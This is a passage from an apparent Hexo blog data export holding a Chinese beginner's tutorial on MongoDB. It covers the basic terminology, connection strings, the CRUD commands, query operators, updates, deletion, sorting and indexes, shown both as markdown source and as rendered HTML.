  { name: { first: \"Yukihiro\", last: \"Matsumoto\" } }\n)\n\n# 嵌入式文档的查询字段\n# 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。\ndb.bios.find(\n   {\n     \"name.first\": \"Yukihiro\",\n     \"name.last\": \"Matsumoto\"\n   }\n)\n\n# 查询数组元素\n# 查询数组字段contribs包含元素“UNIX”\ndb.bios.find( { contribs: \"UNIX\" } )\n\n# 数组字段设计包含元素“ALGOL”或“Lisp”\ndb.bios.find( { contribs: { $in: [ \"ALGOL\", \"Lisp\" ]} } )\n\n# 数组字段设计包含元素“ALGOL”和“Lisp”\ndb.bios.find( { contribs: { $all: [ \"ALGOL\", \"Lisp\" ] } } )\n\n# contribs的数组大小为4\ndb.bios.find( { contribs: { $size: 4 } } ) \n```\n\n\n\n[**更新文档**](https://www.runoob.com/mongodb/mongodb-update.html)\n\n```bash\ndb.collection.update(\n   <query>, # update的查询条件，类似sql update查询内where后面的。\n   <update>, # 更新内容\n   {\n     upsert: <boolean>, # 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。\n     multi: <boolean>, # 可选，mongodb 默认是false,是否只更新第一条\n     writeConcern: <document> # 可选，抛出异常的级别。\n   }\n)\n```\n\n```bash\n# db.<collecetion>.update(查询条件, 修改条件)\n# - update 会默认将 新对象 替换 旧对象\n# - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改\n#  $set 可以用来修改文档中的指定的属性\n#  $unset 可以用来删除文档中的指定的属性\n\n\ndb.stus.update(\n  {gender: \"女\", name: \"蜘蛛精\" },\n  {gender: \"男\", name: \"孙悟空\", age: 30 }\n)\n\ndb.stus.update({name: \"one\" }, {\n  $set: {\n    gender: \"男\",\n    name: \" 猪八戒\",\n    addr: \"高老庄\"\n  }\n}, {\n  multi: true\n})\n```\n\n\n\n[**删除文档**](https://www.runoob.com/mongodb/mongodb-remove.html)\n\n```bash\ndb.<collecetion>.remove(\n  删除条件,\n  是否删除一个<true为删除一个，默认false>\n)\n# 会删除符合条件的所有数据\n# 如果传递一个空对象，会把所有数据删除\n\ndb.<collecetion>.remove({}) # 性能较差，删除数据，但是不清空集合\n\ndb.<collecetion>.deleteOne(删除条件)\ndb.<collecetion>.deleteMany(删除条件)\n\n\nshow collecetions\ndb.dropDatabase() # 删除 数据库\ndb.<collecetion>.drop() # 清空集合\n```\n\n\n\n### 条件操作符\n\n```bash\n$gt > $gte >=  $lt  < $lte <=  $ne !=  $eq  =\n```\n\n\n\n### $type操作符\n\n 根据字符数据类型查询\n\n```bash\ndb.col.insert([\n\t{title: 'PHP 教程'},\n\t{title: 'Java 教程'},\n\t{title: 'MongoDB 教程'}\n])\n\n# 查询 title 为 string 的文档\ndb.col.find({\"title\" : {$type : 2}})\n或\ndb.col.find({\"title\" : {$type : 'string'}})\n```\n\n### Limit与Skip方法\n\n```bash\ndb.COLLECTION_NAME.find().limit(NUMBER) # 限制查询多少条\ndb.COLLECTION_NAME.find().skip(NUMBER) # 跳过多少条\n```\n\n### sort() 方法\n\n```bash\ndb.col.find({}).sort({\"likes\":-1}) # 数据按字段 likes 的降序排列 1为升序 -1为降序\n```\n\n### createIndex() 方法\n\n索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。\n\n```bash\ndb.col.createIndex({\"title\":1})\n\n# 1、查看集合索引\ndb.col.getIndexes()\n# 2、查看集合索引大小\ndb.col.totalIndexSize()\n# 3、删除集合所有索引\ndb.col.dropIndexes()\n# 4、删除集合指定索引\ndb.col.dropIndex(\"索引名称\")\n```\n","slug":"moogoDB入门一","published":1,"updated":"2020-07-14T09:49:06.200Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr7ht600001twtj05nmr1w","content":"<p>1.<a href=\"https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0\" target=\"_blank\" rel=\"noopener\">MONGODB入门篇</a></p>\n<p>2.<a href=\"https://cloud.tencent.com/developer/article/1455000\" target=\"_blank\" rel=\"noopener\">centos安装mongodb 4.x及配置用户名密码（官方推荐的方式）</a></p>\n<p>3.<a href=\"https://docs.mongodb.com/manual/\" target=\"_blank\" rel=\"noopener\">MONGODB手册</a></p>\n<p>4.<a href=\"https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs/mongoose\" target=\"_blank\" rel=\"noopener\">Express 教程 3：使用数据库 (Mongoose)</a></p>\n<p>5.<a href=\"https://www.runoob.com/mongodb/mongodb-tutorial.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a></p>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><h3 id=\"NoSQL\"><a href=\"#NoSQL\" class=\"headerlink\" title=\"NoSQL\"></a>NoSQL</h3><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。</p>\n<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>\n<p>NoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>\n<h3 id=\"基本术语\"><a href=\"#基本术语\" class=\"headerlink\" title=\"基本术语\"></a>基本术语</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:left\">SQL术语/概念</th>\n<th style=\"text-align:left\">MongoDB术语/概念</th>\n<th style=\"text-align:left\">解释/说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table</td>\n<td style=\"text-align:left\">collection</td>\n<td style=\"text-align:left\">数据库表/集合</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">row</td>\n<td style=\"text-align:left\">document</td>\n<td style=\"text-align:left\">数据记录行/文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">column</td>\n<td style=\"text-align:left\">field</td>\n<td style=\"text-align:left\">数据字段/域</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">索引</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table joins</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">表连接,MongoDB不支持</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">主键,MongoDB自动将_id字段设置为主键</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><p>一个mongodb中可以建立多个数据库。</p>\n<p>数据库命名规范：</p>\n<ul>\n<li>不能是空字符串（””)。</li>\n<li>不得含有’ ‘（空格)、.、$、/、\\和\\0 (空字符)。</li>\n<li>应全部小写。</li>\n<li>最多64字节。</li>\n</ul>\n<p>数据库保留字：<code>admin</code>、<code>local</code>、<code>config</code></p>\n<h3 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h3><p>RDBMS 与 MongoDB 对应的术语：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">RDBMS</th>\n<th style=\"text-align:left\">MongoDB</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">数据库</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">表格</td>\n<td style=\"text-align:left\">集合</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">行</td>\n<td style=\"text-align:left\">文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">列</td>\n<td style=\"text-align:left\">字段</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">表联合</td>\n<td style=\"text-align:left\">嵌入文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">主键</td>\n<td style=\"text-align:left\">主键 (MongoDB 提供了 key 为 _id )</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"数据库基本操作\"><a href=\"#数据库基本操作\" class=\"headerlink\" title=\"数据库基本操作\"></a>数据库基本操作</h2><ul>\n<li>MongoDB连接</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># mongodb://admin:123456@localhost/test</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CRUD\"><a href=\"#CRUD\" class=\"headerlink\" title=\"CRUD\"></a>CRUD</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 展示数据库</span></span><br><span class=\"line\">show dbs</span><br><span class=\"line\"><span class=\"comment\"># 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 向mydb的mycol集合中插入一条数据</span></span><br><span class=\"line\">db.mycol.insert(&#123;<span class=\"string\">\"name\"</span>: <span class=\"string\">\"houfei\"</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\"># MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://www.runoob.com/mongodb/mongodb-create-collection.html\" target=\"_blank\" rel=\"noopener\">创建/删除集合</a></li>\n</ul>\n<p><code>db.createCollection(name, options)</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 创建mycol集合</span></span><br><span class=\"line\">db.createCollection(<span class=\"string\">\"mycol\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。</span></span><br><span class=\"line\">db.mycol.insert(&#123;<span class=\"string\">\"name\"</span>: <span class=\"string\">\"houfei\"</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入数据库</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 查看已存在的集合</span></span><br><span class=\"line\">show collections</span><br><span class=\"line\"><span class=\"comment\"># 删除集合 mycol</span></span><br><span class=\"line\">db.mycol.drop()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://www.runoob.com/mongodb/mongodb-insert.html\" target=\"_blank\" rel=\"noopener\">文档的CRUD</a></li>\n</ul>\n<p><strong>插入文档</strong>——<code>db.&lt;collecetion&gt;.insert(document)</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 向test数据库中插入stus集合中插入一个新的学生对象</span></span><br><span class=\"line\">db.stus.insert(</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"小明\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 向test数据库中插入teather集合中插入2个新的老师对象</span></span><br><span class=\"line\">db.teather.insert([</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"马云\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;,</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"马化腾\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># db.stus.insertOne() 插入一个</span></span><br><span class=\"line\"><span class=\"comment\"># db.stus.insertMany() 插入多个</span></span><br></pre></td></tr></table></figure>\n<p><strong>查询文档</strong>——<code>db.&lt;collection&gt;.find(query（查询条件）, projection（投影）)</code></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">操作</th>\n<th style=\"text-align:center\">格式</th>\n<th style=\"text-align:left\">范例</th>\n<th style=\"text-align:left\">RDBMS中的类似语句</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">等于</td>\n<td style=\"text-align:center\"><code>{:</code>}</td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;by&quot;:&quot;菜鸟教程&quot;}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where by = &#39;菜鸟教程&#39;</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">小于</td>\n<td style=\"text-align:center\"><code>{:{$lt:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$lt:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &lt; 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">小于或等于</td>\n<td style=\"text-align:center\"><code>{:{$lte:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$lte:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &lt;= 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">大于</td>\n<td style=\"text-align:center\"><code>{:{$gt:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$gt:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &gt; 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">大于或等于</td>\n<td style=\"text-align:center\"><code>{:{$gte:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$gte:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &gt;= 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">不等于</td>\n<td style=\"text-align:center\"><code>{:{$ne:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$ne:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes != 50</code></td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据</span></span><br><span class=\"line\">db.col.find(&#123;</span><br><span class=\"line\">\t<span class=\"string\">\"likes\"</span>: &#123;<span class=\"variable\">$gt</span>:50&#125;,</span><br><span class=\"line\">\t<span class=\"variable\">$or</span>: [&#123;<span class=\"string\">\"by\"</span>: <span class=\"string\">\"菜鸟教程\"</span>&#125;,&#123;<span class=\"string\">\"title\"</span>: <span class=\"string\">\"MongoDB 教程\"</span>&#125;]</span><br><span class=\"line\">&#125;).pretty()</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://docs.mongodb.com/manual/reference/method/db.collection.find/#query-an-array-of-documents\" target=\"_blank\" rel=\"noopener\"><em>案例</em></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 向 bios 集合插入如下文档</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"_id\"</span> : &lt;value&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"name\"</span> : &#123; <span class=\"string\">\"first\"</span> : &lt;string&gt;, <span class=\"string\">\"last\"</span> : &lt;string&gt; &#125;,       // embedded document</span><br><span class=\"line\">    <span class=\"string\">\"birth\"</span> : &lt;ISODate&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"death\"</span> : &lt;ISODate&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"contribs\"</span> : [ &lt;string&gt;, ... ],                           // Array of Strings</span><br><span class=\"line\">    <span class=\"string\">\"awards\"</span> : [</span><br><span class=\"line\">        &#123; <span class=\"string\">\"award\"</span> : &lt;string&gt;, year: &lt;number&gt;, by: &lt;string&gt; &#125;  // Array of embedded documents</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全部查询</span></span><br><span class=\"line\"><span class=\"comment\"># 查询所有数据</span></span><br><span class=\"line\">db.bios.find()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 标准查询</span></span><br><span class=\"line\"><span class=\"comment\"># 查询_id 为5的数据</span></span><br><span class=\"line\">db.bios.find( &#123; _id: 5 &#125; )</span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象下的 last 属性值为 Hopper 的所有数据</span></span><br><span class=\"line\">db.bios.find( &#123; <span class=\"string\">\"name.last\"</span>: <span class=\"string\">\"Hopper\"</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用运算符的查询</span></span><br><span class=\"line\"><span class=\"comment\"># 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123; _id: &#123; <span class=\"variable\">$in</span>: [ 5, ObjectId(<span class=\"string\">\"507c35dd8fada716c89d0013\"</span>) ] &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1950-01-01') 的文档</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">\t&#123; birth: &#123; <span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1950-01-01'</span>) &#125; &#125; </span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123; <span class=\"string\">\"name.last\"</span>: &#123; <span class=\"variable\">$regex</span>: /^N/ &#125; &#125;</span><br><span class=\"line\">) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询范围</span></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档</span></span><br><span class=\"line\">db.bios.find( </span><br><span class=\"line\">\t&#123; birth: &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1940-01-01'</span>),</span><br><span class=\"line\">\t\t<span class=\"variable\">$lt</span>: new Date(<span class=\"string\">'1960-01-01'</span>) </span><br><span class=\"line\">  &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档</span></span><br><span class=\"line\">db.bios.find( &#123;</span><br><span class=\"line\">   birth: &#123; <span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1920-01-01'</span>) &#125;,</span><br><span class=\"line\">   death: &#123; <span class=\"variable\">$exists</span>: <span class=\"literal\">false</span> &#125;</span><br><span class=\"line\">&#125; ) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询精确匹配嵌入的文档</span></span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象为 &#123; first: \"Yukihiro\", last: \"Matsumoto\" &#125; 的文档（包括顺序，并且不能包含其他属性）</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">    &#123; name: &#123; first: <span class=\"string\">\"Yukihiro\"</span>, last: <span class=\"string\">\"Matsumoto\"</span> &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 嵌入式文档的查询字段</span></span><br><span class=\"line\"><span class=\"comment\"># 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"string\">\"name.first\"</span>: <span class=\"string\">\"Yukihiro\"</span>,</span><br><span class=\"line\">     <span class=\"string\">\"name.last\"</span>: <span class=\"string\">\"Matsumoto\"</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询数组元素</span></span><br><span class=\"line\"><span class=\"comment\"># 查询数组字段contribs包含元素“UNIX”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: <span class=\"string\">\"UNIX\"</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数组字段设计包含元素“ALGOL”或“Lisp”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$in</span>: [ <span class=\"string\">\"ALGOL\"</span>, <span class=\"string\">\"Lisp\"</span> ]&#125; &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数组字段设计包含元素“ALGOL”和“Lisp”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$all</span>: [ <span class=\"string\">\"ALGOL\"</span>, <span class=\"string\">\"Lisp\"</span> ] &#125; &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># contribs的数组大小为4</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$size</span>: 4 &#125; &#125; )</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.runoob.com/mongodb/mongodb-update.html\" target=\"_blank\" rel=\"noopener\"><strong>更新文档</strong></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.collection.update(</span><br><span class=\"line\">   &lt;query&gt;, <span class=\"comment\"># update的查询条件，类似sql update查询内where后面的。</span></span><br><span class=\"line\">   &lt;update&gt;, <span class=\"comment\"># 更新内容</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     upsert: &lt;boolean&gt;, <span class=\"comment\"># 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</span></span><br><span class=\"line\">     multi: &lt;boolean&gt;, <span class=\"comment\"># 可选，mongodb 默认是false,是否只更新第一条</span></span><br><span class=\"line\">     writeConcern: &lt;document&gt; <span class=\"comment\"># 可选，抛出异常的级别。</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># db.&lt;collecetion&gt;.update(查询条件, 修改条件)</span></span><br><span class=\"line\"><span class=\"comment\"># - update 会默认将 新对象 替换 旧对象</span></span><br><span class=\"line\"><span class=\"comment\"># - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改</span></span><br><span class=\"line\"><span class=\"comment\">#  $set 可以用来修改文档中的指定的属性</span></span><br><span class=\"line\"><span class=\"comment\">#  $unset 可以用来删除文档中的指定的属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">db.stus.update(</span><br><span class=\"line\">  &#123;gender: <span class=\"string\">\"女\"</span>, name: <span class=\"string\">\"蜘蛛精\"</span> &#125;,</span><br><span class=\"line\">  &#123;gender: <span class=\"string\">\"男\"</span>, name: <span class=\"string\">\"孙悟空\"</span>, age: 30 &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">db.stus.update(&#123;name: <span class=\"string\">\"one\"</span> &#125;, &#123;</span><br><span class=\"line\">  <span class=\"variable\">$set</span>: &#123;</span><br><span class=\"line\">    gender: <span class=\"string\">\"男\"</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\" 猪八戒\"</span>,</span><br><span class=\"line\">    addr: <span class=\"string\">\"高老庄\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  multi: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.runoob.com/mongodb/mongodb-remove.html\" target=\"_blank\" rel=\"noopener\"><strong>删除文档</strong></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.&lt;collecetion&gt;.remove(</span><br><span class=\"line\">  删除条件,</span><br><span class=\"line\">  是否删除一个&lt;<span class=\"literal\">true</span>为删除一个，默认<span class=\"literal\">false</span>&gt;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># 会删除符合条件的所有数据</span></span><br><span class=\"line\"><span class=\"comment\"># 